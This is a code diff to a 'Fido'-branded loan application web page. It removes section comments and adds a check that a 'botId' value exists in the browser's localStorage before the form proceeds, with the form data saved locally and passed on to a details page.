@@ -12,7 +12,6 @@
       background: #ffffff;
     }
 
-    /* ===== HEADER ===== */
     .brand-bar {
       width: 100%;
       height: 72px;
@@ -42,7 +41,6 @@
       letter-spacing: 1.5px;
     }
 
-    /* ===== CONTENT ===== */
     .container {
       max-width: 420px;
       margin: auto;
@@ -122,7 +120,6 @@
 </head>
 <body>
 
-  <!-- HEADER -->
   <div class="brand-bar">
     <img src="fido-logo.jpeg" alt="Fido Logo">
     <div class="brand-text-wrap">
@@ -130,7 +127,6 @@
     </div>
   </div>
 
-  <!-- CONTENT -->
   <div class="container">
 
     <div class="header">
@@ -208,6 +204,13 @@
     const interestCheck = document.getElementById('interestCheck');
     const button = document.getElementById('continueBtn');
 
+    // ✅ ENSURE botId EXISTS
+    const botId = localStorage.getItem('botId');
+    if (!botId) {
+      alert('Invalid session. Please start again.');
+      window.location.href = 'index.html';
+    }
+
     function updateButton() {
       button.disabled = !(termsCheck.checked && interestCheck.checked);
     }
@@ -220,10 +223,7 @@
 
       const data = Object.fromEntries(new FormData(form));
 
-      // Store full form data
       localStorage.setItem('loanFormData', JSON.stringify(data));
-
-      // Store name separately (used later)
       localStorage.setItem('fullName', data.fullName);
 
       window.location.href = 'details.html';
